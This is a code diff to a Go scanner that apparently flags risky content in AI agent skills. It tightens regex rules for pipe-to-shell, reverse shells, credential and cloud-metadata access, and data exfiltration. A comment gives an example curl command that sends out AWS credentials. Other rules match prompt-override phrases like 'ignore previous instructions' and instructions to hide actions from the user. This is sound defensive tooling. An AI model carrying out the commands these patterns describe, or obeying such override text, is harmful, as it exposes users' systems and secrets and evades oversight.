@@ -20,6 +20,19 @@ type rule struct {
 	// must never reject a line the regex would match (see TestPrefilterCoversSamples).
 	Pre    []string
 	MinLen int
+	// Strip removes spans (blanked before matching) that are known benign
+	// look-alikes, so Re can stay a simple detector. Evidence is still the
+	// original line. Pre is evaluated on the original line, so it stays a
+	// superset filter.
+	Strip *regexp.Regexp
+}
+
+// match reports whether the rule fires on line.
+func (r rule) match(line string) bool {
+	if r.Strip != nil {
+		line = r.Strip.ReplaceAllString(line, " ")
+	}
+	return r.Re.MatchString(line)
 }
 
 func (r rule) maybe(lower string) bool {
@@ -56,11 +69,22 @@ var lineRules = []rule{
 	{ID: "SKG-EXEC-001", Name: "pipe-to-shell", Family: "EXEC", Sev: High, Caps: []string{"remote_exec", "network_egress", "dynamic_exec"},
 		Pre: []string{"curl", "wget", "fetch"},
 		Msg: "downloads and pipes straight into an interpreter",
-		Re:  re(`\b(curl|wget|fetch)\b[^\n|]*\|\s*(sudo\s+)?((ba|z|da|k)?sh|python3?|node|perl|ruby)\b`)},
+		// The interpreter must read the download from stdin as its program: no
+		// script path, and no -c/-m/-e style argument that carries other code
+		// (so "| python3 -m json.tool" and "| python script.py" are data
+		// pipes, while "| sh", "| sudo bash -s -- -y" and "| python3 -" fire).
+		Re: re(`\b(curl|wget|fetch)\b[^\n|]*\|\s*(sudo\s+(-\S+\s+)*)?(` +
+			`(ba|z|da|k)?sh\s+-\S*s\S*(\s|$)|` +
+			`((ba|z|da|k)?sh(\s+-([^c\s]\S*)?)*|python3?(\s+-([^cm\s]\S*)?)*|(node|perl|ruby)(\s+-([^ecpm\s]\S*)?)*)` +
+			`\s*(\d?[<>]|[|;&)\x60'"#]|$))`)},
 	{ID: "SKG-EXEC-002", Name: "reverse-shell", Family: "EXEC", Sev: High, Caps: []string{"network_egress", "dynamic_exec"},
-		Pre: []string{"/dev/tcp/", "bash", "mkfifo", "socat", " -e"},
+		Pre: []string{"/dev/tcp/", "/dev/udp/", "sh -i", "mkfifo", "socat", " -e"},
 		Msg: "reverse-shell pattern",
-		Re:  re(`/dev/tcp/|\bnc\b[^\n]*\s-e\b|\bbash\s+-i\b|mkfifo[^\n]*\bnc\b|socat[^\n]*exec`)},
+		// A /dev/tcp port probe against loopback, or a bare connect test with a
+		// variable host (exec 3<>"/dev/tcp/$host/$port"), is not a shell: the
+		// rule wants fd duplication, a literal remote host, or an interactive shell.
+		Strip: re(`/dev/(tcp|udp)/(127\.\d+\.\d+\.\d+|localhost|\[?::1\]?)`),
+		Re:    re(`\b(ba|z|da|k)?sh\s+-i\b|/dev/(tcp|udp)/\S*\s*\d?[<>]&\s*\d|[<>]&\s*["']?/dev/(tcp|udp)/|[<>]\s*["']?/dev/(tcp|udp)/[a-z0-9]|\bnc\b[^\n]*\s-e\b|mkfifo[^\n]*\bnc\b|\bsocat\b[^\n]*exec`)},
 	{ID: "SKG-EXEC-003", Name: "destructive", Family: "EXEC", Sev: High, Caps: []string{"destructive_write"},
 		Pre: []string{"rm ", "rm\t"},
 		Msg: "recursive delete of root or home",
@@ -76,11 +100,19 @@ var lineRules = []rule{
 	{ID: "SKG-EXEC-006", Name: "persistence", Family: "EXEC", Sev: Medium, Caps: []string{"persistence"}, DocLow: true,
 		Pre: []string{".bashrc", ".zshrc", ".zprofile", ".bash_profile", ".profile", "crontab", "launchctl", "launchagents", "systemd", "systemctl"},
 		Msg: "shell startup or scheduler persistence",
-		Re:  re(`\.(bashrc|zshrc|zprofile|bash_profile)\b|\.profile\b|crontab|launchctl|LaunchAgents|systemd|systemctl`)},
+		// Dotfile names only count as a path component: "user.profile.name",
+		// "args.profile" and "case .profile:" are code, not ~/.profile.
+		Re: re(`(^|[^\w.\-)\]?])\.(bashrc|zshrc|zprofile|bash_profile)\b|(^|[\s'"=\x60(/~])\.profile($|['"\x60\s)])|crontab|launchctl|LaunchAgents|systemd|systemctl`)},
 	{ID: "SKG-SECRETS-001", Name: "credential-access", Family: "SECRETS", Sev: High, Caps: []string{"sensitive_read"},
-		Pre: []string{".ssh", ".aws", ".gnupg", ".kube", ".netrc", ".npmrc", ".pypirc", "docker/config.json", "id_rsa", "id_ed25519", "credentials.json", "find-generic-password", "login data", ".config/gcloud", "keychain"},
+		Pre: []string{".ssh", ".aws", ".gnupg", ".kube", ".netrc", ".npmrc", ".pypirc", "docker/config.json", "id_rsa", "id_ed25519", "credentials.json", "find-generic-password", "login data", ".config/gcloud", "keychain", "169.254.169.254", "metadata.google"},
 		Msg: "touches credential or secret locations",
-		Re:  re(`\.(ssh|aws|gnupg|kube|netrc|npmrc|pypirc)\b|docker/config\.json|id_rsa|id_ed25519|credentials\.json|find-generic-password|Login Data|\.config/gcloud|\bkeychain`)},
+		// The dotfile must be a whole path component: "x.aws[...]", "ebs.csi.aws.com",
+		// "Principal.AWS" and ".kube-system" are not ~/.aws or ~/.kube. Public
+		// keys (id_rsa.pub) are not secrets.
+		Strip: re(`(\.ssh/)?id_(rsa|ed25519|ecdsa|dsa)\.pub\b`),
+		Re: re(`(^|[^\w.\-)\]$])\.(ssh|aws|gnupg|kube|netrc|npmrc|pypirc)($|[/\\'"\x60\s,:;)|*>}\]])|docker/config\.json|id_rsa|id_ed25519|credentials\.json|find-generic-password|Login Data|\.config/gcloud|\bkeychain|` +
+			// cloud metadata credential endpoints (IMDS), the other place a skill can read cloud credentials from
+			`169\.254\.169\.254[^\s"']*(security-credentials|/token)|metadata\.google\.internal[^\s"']*/token`)},
 	{ID: "SKG-SECRETS-002", Name: "env-access", Family: "SECRETS", Sev: Medium, Caps: []string{"env_read"}, DocLow: true,
 		Pre: []string{"os.environ", "process.env", "os.getenv", "printenv", "$", ".env"},
 		Msg: "reads environment or secrets",
@@ -88,7 +120,11 @@ var lineRules = []rule{
 	{ID: "SKG-SECRETS-003", Name: "exfiltration", Family: "SECRETS", Sev: High, Caps: []string{"network_egress", "sensitive_read"},
 		Pre: []string{"curl", "wget"},
 		Msg: "uploads secrets or environment over the network",
-		Re:  re(`\b(curl|wget)\b[^\n]*(-d|--data[a-z-]*|-F|--upload-file|-T)\s*@?[^\n]*(\.env\b|id_rsa|credentials|printenv|\$\(?env\b)`)},
+		// Upload flags are whole case-sensitive tokens: "-fsS" is not -F, and
+		// a GET of .../security-credentials/ uploads nothing.
+		Re: re(`\b(curl|wget)\b[^\n]*((^|\s)(?-i:-d|--data[a-z-]*|-F|--form|-T|--upload-file|--post-file|--post-data|--body-file)([\s=@]|$)[^\n]*(\.env\b|id_rsa|credentials|printenv|(?-i:\$\(?env\b))|` +
+			// secrets pulled into the request by command substitution: curl "https://x/?d=$(cat ~/.aws/credentials)"
+			`\$\((cat|base64|curl|wget|printenv|env)\b[^)]*(\.env\b|id_rsa|\.aws|\.ssh|credentials|printenv))`)},
 	{ID: "SKG-NET-001", Name: "network-tool", Family: "NET", Sev: Medium, Caps: []string{"network_egress"}, DocLow: true,
 		Pre: []string{"curl", "wget", "ncat", "ssh", "scp", "rsync", "ftp", " nc ", "\tnc ", "|nc", "(nc", ";nc", "`nc"},
 		Msg: "network tool",
@@ -102,9 +138,15 @@ var lineRules = []rule{
 		Msg: "tries to override higher-priority instructions",
 		Re:  re(`ignore\s+(all\s+|any\s+)?(the\s+)?(previous|prior|above|earlier|system)\s+(instructions|prompts?|rules)|disregard\s+[^\n]{0,40}(instructions|rules|system prompt)|you\s+are\s+now\s+(in\s+)?(dan|developer mode|unrestricted)|(system|developer)\s+(prompt|message)\s+override`)},
 	{ID: "SKG-PROMPT-002", Name: "concealment", Family: "PROMPT", Sev: High,
-		Pre: []string{"tell", "inform", "mention", "reveal", "show", "notify", "telling", "notifying", "asking", "silently", "secretly", "covertly", "quietly"},
+		Pre: []string{"tell", "inform", "mention", "reveal", "show", "notify", "disclose", "silently", "secretly", "covertly", "quietly"},
 		Msg: "asks the agent to hide actions from the user",
-		Re:  re(`(do\s+not|don'?t|never)\s+(tell|inform|mention|reveal|show|notify)[^\n]{0,40}\buser\b|without\s+(telling|informing|notifying|asking)\s+(the\s+)?user|(silently|secretly|covertly|quietly)\s+(run|execute|send|upload|post|install|download)`)},
+		// Concealment needs the user as the object of the hiding. "without asking
+		// the user" and "never show the tip when the user asks" are ordinary
+		// autonomy and UI rules, and "do not silently install" or a bullet
+		// that forbids acting "without telling the user" is the opposite of
+		// concealment, so negated forms are stripped before matching.
+		Strip: re(`(do\s+not|don'?t|never|must\s+not|mustn'?t|should\s+not|shouldn'?t|cannot|can'?t|not|without|avoid)\s+(\w+\s+){0,2}(silently|secretly|covertly|quietly)\b|(do\s+not|don'?t|never|must\s+not|should\s+not|avoid|not|❌|✗|✘|🚫)[^\n.;]{0,60}?\bwithout\s+(telling|informing|notifying)\b`),
+		Re:    re(`(do\s+not|don'?t|never)\s+(tell|inform|notify)\s+(the\s+|your\s+)?user\b|(do\s+not|don'?t|never)\s+(mention|reveal|show|disclose|tell)\s+[^\n.]{0,40}\bto\s+(the\s+)?user\b|without\s+(telling|informing|notifying)\s+(the\s+)?user\b|(silently|secretly|covertly|quietly)\s+(run|execute|send|upload|post|install|download)\b`)},
 	{ID: "SKG-PROMPT-003", Name: "safety-bypass", Family: "PROMPT", Sev: Medium,
 		Pre: []string{"disable", "bypass", "skip", "--yolo"},
 		Msg: "asks to bypass safety controls",
